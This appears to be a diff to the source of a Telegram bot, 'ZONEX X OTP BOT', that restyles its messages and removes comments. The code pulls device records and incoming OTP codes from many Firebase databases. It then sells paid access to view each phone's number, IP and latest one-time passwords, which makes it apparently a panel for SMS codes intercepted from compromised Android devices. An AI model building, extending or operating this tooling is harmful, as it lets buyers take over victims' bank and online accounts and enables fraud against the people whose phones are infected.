@@ -3,8 +3,7 @@
 """
 ╔══════════════════════════════════════════╗
 ║        ZONEX X OTP BOT v4.6              ║
-║  Channel Gate · Key Entry · Time Plans   ║
-║  Referral · Multi-Firebase · Admin Panel ║
+║  High Level UI · Channel Gate · Admin    ║
 ╚══════════════════════════════════════════╝
 """
 
@@ -28,12 +27,12 @@ _admin_ids_setting = (
     or "8917259924"
 )
 ADMIN_IDS      = [int(x.strip()) for x in _admin_ids_setting.split(",") if x.strip()]
-ADMIN_USERNAME = "@AG14447"
+ADMIN_USERNAME = "@AG01448"
 BOT_DEV        = "@zonexarmy"
 DATA_FILE      = "bot/data.json"
 AUTO_REFRESH   = 10
 
-# ─── Firebase Configuration (UPDATED with your config) ─────────────────────
+# ─── Firebase Configuration ──────────────────────────────────────────────────
 FIREBASE_CONFIG = {
     "apiKey": os.getenv("FIREBASE_API_KEY", ""),
     "authDomain": "era-ka-store.firebaseapp.com",
@@ -42,10 +41,9 @@ FIREBASE_CONFIG = {
     "messagingSenderId": "540743058625",
     "appId": "1:540743058625:web:d0938c9cfa3e4750e48040",
     "measurementId": "G-QZGN0SFYHC",
-    "databaseURL": "https://era-ka-store-default-rtdb.firebaseio.com"  # Added for RTDB
+    "databaseURL": "https://era-ka-store-default-rtdb.firebaseio.com"
 }
 
-# Use API Key from config
 GAPI_KEY = FIREBASE_CONFIG["apiKey"]
 FS_PROJECT = FIREBASE_CONFIG["projectId"]
 FS_RTDB_URL = f"https://{FS_PROJECT}-default-rtdb.firebaseio.com/bot_data.json"
@@ -53,10 +51,10 @@ FS_RTDB_URL = f"https://{FS_PROJECT}-default-rtdb.firebaseio.com/bot_data.json"
 DEVICES_PER_PAGE = 6
 WELCOME_HOURS  = 1
 
-CHANNELS = ["zonexarmy", "SMARTEARNERS011"]   # force-join channels (without @)
+CHANNELS = ["zonexarmy", "SMARTEARNERS011"]   # force-join channels
 CH_NAMES = {
-    "zonexarmy": "𝐙𝐎𝐍𝐄𝐗 𝐀𝐫𝐞𝐚 💸💸",
-    "SMARTEARNERS011": "SMART EARNERS",
+    "zonexarmy": "📢 𝐙𝐎𝐍𝐄𝐗 𝐀𝐫𝐞𝐚 💸💸",
+    "SMARTEARNERS011": "⚔️ SMART EARNERS",
 }
 
 # ─── Conversation states ──────────────────────────────────────────────────────
@@ -128,24 +126,19 @@ def save_data(d: dict):
     os.makedirs(os.path.dirname(DATA_FILE), exist_ok=True)
     with open(DATA_FILE, "w") as f:
         json.dump(d, f, indent=2)
-    # Push to Firebase Realtime Database
     try:
         loop = asyncio.get_running_loop()
         loop.create_task(_push_firestore(d))
     except RuntimeError:
-        pass  # No running loop yet
+        pass
 
 async def _push_firestore(d: dict):
-    """Push bot data to Firebase Realtime Database with your API key."""
     if not GAPI_KEY:
         logger.warning("⚠️ GAPI_KEY not set! Data not saved to Firebase.")
         return
-    
     try:
         payload = json.dumps(d, separators=(",", ":"))
-        # Use your actual Firebase API key for authentication
         url = f"{FS_RTDB_URL}?auth={GAPI_KEY}"
-        
         async with _get_session().put(url, data=payload,
                          headers={"Content-Type": "application/json"}) as r:
             if r.status in (200, 201):
@@ -157,11 +150,9 @@ async def _push_firestore(d: dict):
         logger.warning(f"❌ Firebase RTDB push error: {e}")
 
 async def _load_firestore() -> bool:
-    """Load bot data from Firebase Realtime Database on startup."""
     if not GAPI_KEY:
         logger.warning("⚠️ GAPI_KEY not set! Using local data only.")
         return False
-    
     try:
         url = f"{FS_RTDB_URL}?auth={GAPI_KEY}"
         async with _get_session().get(url) as r:
@@ -169,8 +160,6 @@ async def _load_firestore() -> bool:
                 d = await r.json()
                 if not isinstance(d, dict):
                     return False
-                
-                # Apply migrations
                 d.pop("activation_codes", None)
                 for uid, u in d.get("users", {}).items():
                     u.setdefault("key",            _gen_key_raw())
@@ -190,7 +179,6 @@ async def _load_firestore() -> bool:
                 global data
                 data = d
                 
-                # Write local backup
                 os.makedirs(os.path.dirname(DATA_FILE), exist_ok=True)
                 with open(DATA_FILE, "w") as f:
                     json.dump(d, f, indent=2)
@@ -208,12 +196,9 @@ async def _load_firestore() -> bool:
         logger.warning(f"Firebase load error: {e}")
     return False
 
-# Load data (will try Firebase first, then fallback to local)
 data = load_data()
 
-# Try to load from Firebase on startup (async, will be called in _on_startup)
 async def _sync_from_firebase_on_startup():
-    """Try to load from Firebase on startup"""
     loaded = await _load_firestore()
     if not loaded:
         logger.info("⚠️ Using local data.json (Firebase not available or empty)")
@@ -228,8 +213,8 @@ def get_referral_hours() -> float:
 device_cache: dict   = {}
 otp_cache:    dict   = {}
 last_refresh         = "Never"
-fb_last_sync: dict   = {}   # label -> "HH:MM:SS" when last synced
-fb_conn_status: dict = {}   # label -> "ok" | "error" | "timeout" | "auth"
+fb_last_sync: dict   = {}
+fb_conn_status: dict = {}
 
 # ─── Global HTTP session ─────────────────────────────────────────────────────
 _http_session: Optional[aiohttp.ClientSession] = None
@@ -468,8 +453,6 @@ async def refresh_firebase(cfg: dict):
     clients = await fb_get(url, "clients", key)
     if not isinstance(clients, dict): return
 
-    today = now_dt().date()
-
     valid = []
     for dev_id, info in clients.items():
         if not isinstance(info, dict): continue
@@ -612,16 +595,12 @@ def _has_valid_phone(info: dict) -> bool:
         return False
     if low.endswith("new"):
         return False
-    # Space nahi hona chahiye number mein
     if " " in ph:
         return False
-    # Sirf digits aur ek leading '+' allowed hai
     stripped = ph.lstrip("+")
-    # Letters ya special chars (o, nya, etc.) reject karo
     if not stripped.isdigit():
         return False
-    digits_only = stripped
-    if len(digits_only) < 6:
+    if len(stripped) < 6:
         return False
     return True
 
@@ -648,22 +627,28 @@ def resolve_label(esc: str) -> str:
             return cfg["label"]
     return esc
 
-# ─── Text builders ────────────────────────────────────────────────────────────
+# ─── Text builders (High Level ERA Style) ─────────────────────────────────────
 def txt_welcome_panel(name: str, uid: int) -> str:
     tl  = time_left_str(uid)
     on  = count_online()
     otp = count_otps()
     dbs = len(data['firebase_configs'])
+    
     return (
-        f"🤖 <b>ZONEX X OTP Bot</b>\n"
-        f"{'━'*28}\n\n"
-        f"👋 Hey, <b>{name}!</b>\n"
-        f"⏱ Access  ›  <b>{tl}</b>\n\n"
-        f"<b>📡 Live Status</b>\n"
-        f"  ├ 🟢 Online   <code>{on}</code> device{'s' if on!=1 else ''}\n"
-        f"  ├ 🔑 OTPs     <code>{otp}</code>\n"
-        f"  └ 🔥 Firebase  <code>{dbs}</code> DB\n\n"
-        f"<i>🕐 Last sync: {last_refresh}  ·  auto {AUTO_REFRESH}s</i>"
+        f"┌───────────────────────┐\n"
+        f"│   🤖 <b>ZONEX X OTP BOT</b>   │\n"
+        f"└───────────────────────┘\n\n"
+        f"👋 Welcome, <b>{name}</b>!\n\n"
+        f"┌───────────────────────┐\n"
+        f"│ ⏱ <b>ACCESS</b>  ›  {tl}\n"
+        f"│ 🟢 <b>STATUS</b>  ›  ✅ Active\n"
+        f"└───────────────────────┘\n\n"
+        f"┌─────── 🛰️ <b>LIVE STATS</b> ───────┐\n"
+        f"│ 🟢 Online     › <b>{on}</b>\n"
+        f"│ 🔑 Total OTPs › <b>{otp}</b>\n"
+        f"└──────────────────────────────┘\n\n"
+        f"🕐 Last Sync  › <code>{last_refresh}</code>\n"
+        f"🔄 Auto Refresh › <b>{AUTO_REFRESH}s</b>"
     )
 
 def _val(v: str) -> bool:
@@ -680,27 +665,32 @@ def txt_device_card(label: str, dev_id: str) -> str:
     last_seen = str(info.get('last_seen','—'))
 
     header = (
-        f"📱 <b><code>{phone}</code></b>  <i>(tap to copy)</i>\n"
-        f"{'━'*28}\n"
-        f"🔋 Battery  ›  <code>{battery}</code>\n"
-        f"🤖 Android  ›  <code>{android}</code>\n"
-        f"📡 Network  ›  <code>{network}</code>\n"
-        f"🌐 IP       ›  <code>{ip}</code>\n"
-        f"🕐 Last Seen›  <code>{last_seen}</code>\n"
-        f"🔥 DB       ›  <code>{label}</code>\n\n"
-        f"<b>🔑 Latest OTP</b>\n{'─'*28}"
+        f"┌───────────────────────┐\n"
+        f"│   📱 <b>DEVICE INFO</b>      │\n"
+        f"└───────────────────────┘\n\n"
+        f"┌───────────────────────┐\n"
+        f"│ 📞 Number   › <code>{phone}</code>\n"
+        f"│ 🔋 Battery  › <code>{battery}</code>\n"
+        f"│ 🤖 Android  › <code>{android}</code>\n"
+        f"│ 📡 Network  › <code>{network}</code>\n"
+        f"│ 🌐 IP       › <code>{ip}</code>\n"
+        f"│ 🕐 Last Seen› <code>{last_seen}</code>\n"
+        f"│ 🔥 Database › <code>{label}</code>\n"
+        f"└───────────────────────┘\n\n"
     )
 
     lines = [header]
     if otps:
         e = otps[0]
         lines.append(
-            f"\n  ⚡ <b><code>{e['otp']}</code></b>\n"
-            f"  📤 <i>{e['sender']}</i>\n"
-            f"  🕐 {e['time']}"
+            f"┌─────── 🔑 <b>LATEST OTP</b> ───────┐\n"
+            f"│ ⚡ <b>CODE</b>   › <code>{e['otp']}</code>\n"
+            f"│ 📤 <b>Sender</b> › <code>{e['sender']}</code>\n"
+            f"│ 🕐 <b>Time</b>   › <code>{e['time']}</code>\n"
+            f"└─────────────────────────────┘"
         )
     else:
-        lines.append("\n  ❌ <i>Koi recent OTP nahi mila</i>")
+        lines.append("\n❌ <i>Koi recent OTP nahi mila</i>")
     return "".join(lines)
 
 def txt_otp_alert(label: str, dev_id: str, e: dict, info: dict) -> str:
@@ -822,11 +812,10 @@ def kb_online(devices: list, page: int) -> InlineKeyboardMarkup:
     for i in range(0, len(chunk), 2):
         row = []
         for lb, did, info in chunk[i:i+2]:
-            cnt  = len(otp_cache.get(lb,{}).get(did,[]))
             ph   = _normalize_phone(info.get("phone","—"))
             ph_short = ph[-10:] if ph != "—" else "—"
             esc  = lb.replace(":","_")
-            row.append(InlineKeyboardButton(f"🟢 {ph_short} [{cnt}🔑]",
+            row.append(InlineKeyboardButton(f"🟢 {ph_short}",  # <-- Removed [x🔑]
                                             callback_data=f"dev:{esc}:{did}:{page}"))
         rows.append(row)
     nav, total = [], max(1,(len(devices)+DEVICES_PER_PAGE-1)//DEVICES_PER_PAGE)
@@ -901,7 +890,6 @@ def kb_admin() -> InlineKeyboardMarkup:
     ])
 
 def _fb_online_count(label: str) -> int:
-    """Online device count for one Firebase label."""
     return sum(
         1 for d in device_cache.get(label, {}).values()
         if d.get("online") and _has_valid_phone(d)
@@ -911,7 +899,6 @@ def _fb_total_count(label: str) -> int:
     return len(device_cache.get(label, {}))
 
 def txt_firebase_panel() -> str:
-    """Detailed Firebase management panel text."""
     total_on  = count_online()
     total_dev = count_total()
     total_dbs = len(data["firebase_configs"])
@@ -1025,9 +1012,11 @@ async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     all_joined, missing = await check_channels(ctx.bot, uid)
     if not all_joined:
         await update.message.reply_text(
-            f"🤖 <b>ZONEX X OTP Bot</b>\n"
-            f"{'━'*28}\n\n"
-            f"👋 <b>Welcome {name}!</b>\n\n"
+            f"┌───────────────────────┐\n"
+            f"│  🤖 <b>ZONEX X OTP BOT</b>  │\n"
+            f"└───────────────────────┘\n\n"
+            f"👋 Welcome <b>{name}</b>!\n\n"
+            f"🔒 <b>BOT ACCESS REQUIRED</b>\n\n"
             f"Bot use karne ke liye pehle\n"
             f"yeh channels join karo 👇",
             parse_mode="HTML",
@@ -1059,16 +1048,18 @@ async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
                 )
             except: pass
 
+        # High Level Welcome Message
         await update.message.reply_text(
-            f"🎉 <b>Welcome to ZONEX X OTP Bot!</b>\n"
-            f"{'━'*28}\n\n"
-            f"🎁 <b>{WELCOME_HOURS} Hour FREE access mila!</b>\n\n"
-            f"{'─'*28}\n"
-            f"🗝 <b>Tumhari Permanent Key:</b>\n\n"
+            f"┌────────────────────────┐\n"
+            f"│  🎉 <b>WELCOME TO ZONEX OTP!</b>  │\n"
+            f"└────────────────────────┘\n\n"
+            f"🎁 <b>{WELCOME_HOURS} HOUR FREE ACCESS!</b>\n\n"
+            f"──────────────────────────\n"
+            f"🗝 <b>YOUR PERMANENT KEY:</b>\n\n"
             f"<code>{key}</code>\n\n"
-            f"{'─'*28}\n"
-            f"👆 <b>Upar se key copy karo aur yahan bhejo</b>\n"
-            f"<i>Panel turant khul jaayega ⚡</i>",
+            f"──────────────────────────\n"
+            f"👇 Copy Key & Send It Here\n"
+            f"⚡ Panel Opens Instantly!",
             parse_mode="HTML"
         )
         return WAIT_KEY
@@ -1203,15 +1194,16 @@ async def button(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
             save_data(data)
             key = get_key(uid)
             await q.edit_message_text(
-                f"🎉 <b>Welcome to ZONEX X OTP Bot!</b>\n"
-                f"{'━'*28}\n\n"
-                f"🎁 <b>{WELCOME_HOURS} Hour FREE access mila!</b>\n\n"
-                f"{'─'*28}\n"
-                f"🗝 <b>Tumhari Permanent Key:</b>\n\n"
+                f"┌────────────────────────┐\n"
+                f"│  🎉 <b>WELCOME TO ZONEX OTP!</b>  │\n"
+                f"└────────────────────────┘\n\n"
+                f"🎁 <b>{WELCOME_HOURS} HOUR FREE ACCESS!</b>\n\n"
+                f"──────────────────────────\n"
+                f"🗝 <b>YOUR PERMANENT KEY:</b>\n\n"
                 f"<code>{key}</code>\n\n"
-                f"{'─'*28}\n"
-                f"👆 <b>Upar se key copy karo aur yahan bhejo</b>\n"
-                f"<i>Panel turant khul jaayega ⚡</i>",
+                f"──────────────────────────\n"
+                f"👇 Copy Key & Send It Here\n"
+                f"⚡ Panel Opens Instantly!",
                 parse_mode="HTML"
             )
             ctx.user_data["waiting_key"] = True
@@ -1305,9 +1297,15 @@ async def button(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
                 "🔴 <b>Koi device online nahi</b>\n\n"
                 "<i>Devices aate hi yahan dikh jaayengi.</i>",
                 reply_markup=kb_back(), parse_mode="HTML"); return
+        
+        # High Level ERA Style Online Panel
         await q.edit_message_text(
-            f"📱 <b>Online Devices</b>  ·  <code>{len(devs)}</code> active\n"
-            f"<i>🕐 Sync: {now_dt().strftime('%H:%M:%S')}</i>",
+            f"┌───────────────────────┐\n"
+            f"│   📱 <b>ONLINE DEVICES</b>   │\n"
+            f"└───────────────────────┘\n\n"
+            f"🟢 <b>ACTIVE</b> › <b>{len(devs)}</b> DEVICES\n"
+            f"🕐 <b>SYNC</b> › <code>{now_dt().strftime('%H:%M:%S')}</code>\n"
+            f"{'─'*30}",
             reply_markup=kb_online(devs, pg), parse_mode="HTML")
 
     elif cb.startswith("dev:"):
@@ -1338,12 +1336,10 @@ async def button(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         except Exception as _e:
             logger.warning(f"rfr card edit: {_e}")
 
-        # ── Snapshot cache BEFORE fetch (auto_fetch keeps it current every 10s) ─
         pre_otps = otp_cache.get(lb, {}).get(did, [])
         pre_key  = (pre_otps[0]["otp"], pre_otps[0]["sender"], pre_otps[0]["time"]) \
                    if pre_otps else None
 
-        # ── Fetch fresh OTPs from Firebase ────────────────────────────────────
         fresh_otps = list(pre_otps)
         if cfg:
             try:
@@ -1354,9 +1350,6 @@ async def button(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
             except Exception as fe:
                 logger.warning(f"rfr fetch: {fe}")
 
-        # ── Decide: is the top OTP "fresh enough" to alert? ──────────────────
-        # Fresh = arrived within last 30s (by timestamp) OR is brand-new vs cache
-        # This handles 4/5/6/8-digit OTPs regardless of timestamp parse success.
         tap_time = now_dt()
         cutoff   = tap_time - timedelta(seconds=30)
 
@@ -1366,11 +1359,10 @@ async def button(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
             top_key = (top["otp"], top["sender"], top["time"])
             top_dt  = top.get("_dt")
             is_recent  = (top_dt is not None and top_dt >= cutoff)
-            is_new_otp = (top_key != pre_key)          # not in cache at tap time → new
+            is_new_otp = (top_key != pre_key)
             if is_recent or is_new_otp:
                 otp_to_show = top
 
-        # ── If nothing fresh yet, wait up to 30s for a brand-new OTP ─────────
         if otp_to_show is None and cfg:
             known_key = (fresh_otps[0]["otp"], fresh_otps[0]["sender"], fresh_otps[0]["time"]) \
                         if fresh_otps else None
@@ -1385,12 +1377,10 @@ async def button(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
                     otp_cache.setdefault(lb, {})[did] = polled
                     top     = polled[0]
                     top_key = (top["otp"], top["sender"], top["time"])
-                    # Any OTP different from what was there at tap time is brand-new
                     if top_key != known_key:
                         otp_to_show = top
                         break
 
-        # ── Send alert only if we found a fresh / new OTP ─────────────────────
         if otp_to_show:
             devinfo = device_cache.get(lb, {}).get(did, devinfo)
             try:
@@ -1572,7 +1562,6 @@ async def button(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
                 ]]),
                 parse_mode="HTML")
 
-    # Firebase: Delete — show confirmation first
     elif cb.startswith("fb_del:"):
         if not is_admin(uid): await q.answer("⛔", show_alert=True); return
         try:
@@ -1606,7 +1595,6 @@ async def button(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
                 [InlineKeyboardButton("❌ Cancel",            callback_data="fb_del_cancel")],
             ]))
 
-    # Firebase: Delete confirmed
     elif cb.startswith("fb_del_ok:"):
         if not is_admin(uid): await q.answer("⛔", show_alert=True); return
         try:
@@ -1641,13 +1629,11 @@ async def button(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         except Exception:
             pass
 
-    # Firebase: Cancel delete
     elif cb == "fb_del_cancel":
         if not is_admin(uid): await q.answer("⛔", show_alert=True); return
         await q.edit_message_text(
             txt_firebase_panel(), reply_markup=kb_firebase(), parse_mode="HTML")
 
-    # Firebase: Refresh all and update panel
     elif cb == "fb_refresh":
         if not is_admin(uid): await q.answer("⛔", show_alert=True); return
         try:
@@ -1704,7 +1690,6 @@ async def button(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
             ]]))
         ctx.user_data["fb_step"] = "bulk"
 
-    # Admin: Users
     elif cb == "adm_users":
         if not is_admin(uid): await q.answer("⛔", show_alert=True); return
         users = data["users"]
@@ -1727,7 +1712,6 @@ async def button(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
             ]]),
             parse_mode="HTML")
 
-    # Admin: Add/Reduce Time
     elif cb == "adm_add_time":
         if not is_admin(uid): await q.answer("⛔", show_alert=True); return
         await q.edit_message_text(
@@ -1746,7 +1730,6 @@ async def button(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
             parse_mode="HTML")
         ctx.user_data["awaiting_add_time"] = True
 
-    # Admin: Refer Reward Hours
     elif cb == "adm_refer_hours":
         if not is_admin(uid): await q.answer("⛔", show_alert=True); return
         rh = get_referral_hours()
@@ -1764,7 +1747,6 @@ async def button(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
             parse_mode="HTML")
         ctx.user_data["awaiting_refer_hours"] = True
 
-    # Admin: Set UPI
     elif cb == "adm_set_upi":
         if not is_admin(uid): await q.answer("⛔", show_alert=True); return
         upi = data.get("upi_id","") or "Set nahi hai"
@@ -1779,7 +1761,6 @@ async def button(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
             parse_mode="HTML")
         ctx.user_data["awaiting_upi"] = True
 
-    # Admin: Pricing Plans
     elif cb == "adm_plans":
         if not is_admin(uid): await q.answer("⛔", show_alert=True); return
         await q.edit_message_text("💰 <b>Pricing Plans</b>\n\nYahan plans manage karo:",
@@ -1811,7 +1792,6 @@ async def button(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
             parse_mode="HTML")
         ctx.user_data["plan_step"] = "hours"
 
-    # Admin: Broadcast
     elif cb == "adm_broadcast":
         if not is_admin(uid): await q.answer("⛔", show_alert=True); return
         await q.edit_message_text(
@@ -1825,7 +1805,6 @@ async def button(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
             parse_mode="HTML")
         ctx.user_data["awaiting_broadcast"] = True
 
-    # Admin: Approve payment
     elif cb.startswith("pay_ok:"):
         if not is_admin(uid): await q.answer("⛔", show_alert=True); return
         pay_id  = cb.split(":", 1)[1]
@@ -1865,7 +1844,6 @@ async def button(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
                 ]]))
         except: pass
 
-    # Admin: Reject payment
     elif cb.startswith("pay_no:"):
         if not is_admin(uid): await q.answer("⛔", show_alert=True); return
         pay_id  = cb.split(":", 1)[1]
@@ -1901,7 +1879,6 @@ async def button(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
                 ]]))
         except: pass
 
-    # Admin: Set QR code
     elif cb == "adm_set_qr":
         if not is_admin(uid): await q.answer("⛔", show_alert=True); return
         qr = data.get("qr_file_id", "")
@@ -1916,7 +1893,6 @@ async def button(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
             ]]))
         ctx.user_data["awaiting_qr"] = True
 
-    # Admin: View pending payments
     elif cb == "adm_pending":
         if not is_admin(uid): await q.answer("⛔", show_alert=True); return
         pending = data.get("pending_payments", {})
@@ -1943,7 +1919,6 @@ async def button(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
                 InlineKeyboardButton("◀️ Admin", callback_data="admin")
             ]]))
 
-    # Admin: Ban list
     elif cb == "adm_ban_list":
         if not is_admin(uid): await q.answer("⛔", show_alert=True); return
         users = data["users"]
@@ -1971,7 +1946,6 @@ async def button(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
             parse_mode="HTML",
             reply_markup=InlineKeyboardMarkup(rows))
 
-    # Admin: Ban/Unban toggle
     elif cb.startswith("adm_ban_toggle:"):
         if not is_admin(uid): await q.answer("⛔", show_alert=True); return
         parts   = cb.split(":", 2)
@@ -2007,7 +1981,6 @@ async def button(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
             parse_mode="HTML",
             reply_markup=InlineKeyboardMarkup(rows))
 
-    # Admin: Maintenance toggle
     elif cb == "adm_maintenance":
         if not is_admin(uid): await q.answer("⛔", show_alert=True); return
         current = data.get("maintenance", False)
@@ -2069,25 +2042,22 @@ async def text_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         if not is_admin(uid):
             ud.pop("fb_step", None); return
         ud.pop("fb_step")
-        # Extract all URLs from the message (any line format)
         raw_found = re.findall(
             r"https?://[a-zA-Z0-9\-]+(?:-default-rtdb)?\.firebaseio\.com(?:/[^\s]*)?",
             text)
-        # Also try lines that might be missing https://
         for line in text.splitlines():
             line = line.strip()
             if "firebaseio.com" in line and not line.startswith("http"):
                 candidate = "https://" + line
                 if re.match(r"https://[a-zA-Z0-9\-].*\.firebaseio\.com", candidate):
                     raw_found.append(candidate)
-        # Normalize all URLs (remove trailing slashes, deduplicate)
         seen_in_batch: set = set()
         existing_urls = {c["url"].rstrip("/") for c in data["firebase_configs"]}
         added, skipped, invalid = [], [], 0
         for raw_url in raw_found:
             clean_url = raw_url.rstrip("/")
             if clean_url in seen_in_batch:
-                continue  # duplicate within this batch
+                continue
             seen_in_batch.add(clean_url)
             if clean_url in existing_urls:
                 skipped.append(clean_url)
@@ -2102,12 +2072,10 @@ async def text_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
             added.append((label, clean_url))
         if added or skipped:
             save_data(data)
-        # Immediately refresh all newly added Firebase DBs in background
         for lbl, url in added:
             new_cfg = next((c for c in data["firebase_configs"] if c["url"] == url), None)
             if new_cfg:
                 asyncio.create_task(refresh_clients_only(new_cfg))
-        # Build summary
         total_processed = len(seen_in_batch) + invalid
         lines = [
             f"📦 <b>Bulk Firebase — Result</b>",
@@ -2120,7 +2088,7 @@ async def text_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         ]
         if added:
             lines.append(f"\n<b>✅ Added ({len(added)}):</b>")
-            for lbl, url in added[:20]:  # show max 20
+            for lbl, url in added[:20]:
                 lines.append(f"  • <b>{lbl}</b>")
             if len(added) > 20:
                 lines.append(f"  <i>...aur {len(added)-20} zyada</i>")
@@ -2148,10 +2116,8 @@ async def text_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         if not is_admin(uid):
             ud.pop("fb_step", None); return
         raw = text.strip().rstrip("/")
-        # Normalize: accept both with and without https://
         if not raw.startswith("http"):
             raw = "https://" + raw
-        # Validate it is a Firebase RTDB URL
         if "firebaseio.com" not in raw:
             await update.message.reply_text(
                 "❌ <b>Invalid URL!</b>\n\n"
@@ -2161,7 +2127,6 @@ async def text_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
                 "Dobara sahi URL bhejo ya /cancel likhke chhod do.",
                 parse_mode="HTML")
             return
-        # Duplicate check
         existing_norm = {c["url"].rstrip("/") for c in data["firebase_configs"]}
         if raw in existing_norm:
             await update.message.reply_text(
@@ -2207,7 +2172,6 @@ async def text_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         api_key = ud.pop("fb_api_key", "")
         ud.pop("fb_step")
         label = text.strip()[:30] or "Firebase DB"
-        # Final duplicate check (in case another was added between steps)
         existing_norm = {c["url"].rstrip("/") for c in data["firebase_configs"]}
         if new_url in existing_norm:
             await update.message.reply_text(
@@ -2216,7 +2180,6 @@ async def text_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
                 reply_markup=InlineKeyboardMarkup([[
                     InlineKeyboardButton("🔥 Firebase List", callback_data="adm_firebase")
                 ]])); return
-        # Test connectivity before saving
         wait_msg = await update.message.reply_text(
             "⏳ <b>Firebase check ho raha hai...</b>",
             parse_mode="HTML")
@@ -2225,7 +2188,6 @@ async def text_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
             clients = await fb_get(new_url, "clients", api_key)
             conn_ok = isinstance(clients, dict)
             if clients is None:
-                # None typically means auth error or unreachable
                 conn_ok = False
                 conn_note = "⚠️ URL unreachable ya auth fail. Public DB ho toh bhi add kar diya gaya."
             elif not clients:
@@ -2238,7 +2200,6 @@ async def text_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
             conn_ok = False
             conn_note = f"⚠️ Connection test failed: <i>{str(e)[:80]}</i>"
             logger.warning(f"Firebase connectivity test [{label}]: {e}")
-        # Save regardless (admin may want to add even if currently unreachable)
         new_cfg = {"url": new_url, "label": label, "key": api_key}
         data["firebase_configs"].append(new_cfg)
         save_data(data)
@@ -2583,7 +2544,6 @@ async def auto_fetch(ctx: ContextTypes.DEFAULT_TYPE):
 
 # ─── Main ─────────────────────────────────────────────────────────────────────
 async def _on_startup(app):
-    """Load latest data from Firestore before bot starts polling."""
     await _sync_from_firebase_on_startup()
     logger.info(f"🔥 Firebase DBs: {[c['label'] for c in data['firebase_configs']]}")
     logger.info(f"👥 Total users loaded: {len(data['users'])}")
